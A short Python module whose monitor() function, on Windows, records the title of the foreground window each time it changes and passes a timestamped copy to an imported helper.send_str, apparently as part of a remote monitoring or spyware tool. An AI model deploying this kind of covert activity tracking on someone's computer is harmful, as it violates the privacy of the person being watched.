import sys
import os
sys.path.append(os.path.abspath(".."))
from helperModule import helper

import datetime
import sys
import time

def monitor():
    if sys.platform == "darwin": # for Mac
        pass # To be honest, I don't know much about Mac :/

    elif sys.platform == "win32": # for Windows
        import win32gui

        dt_now = datetime.datetime.now()

        previous = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        helper.send_str(dt_now.strftime('%Y/%m/%d_%H:%M:%S-') + previous)
        time.sleep(1)

        while True:
            now = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if now != previous:
                previous = now
                dt_now = datetime.datetime.now()
                helper.send_str(dt_now.strftime('%Y/%m/%d_%H:%M:%S-') + previous)
            time.sleep(1)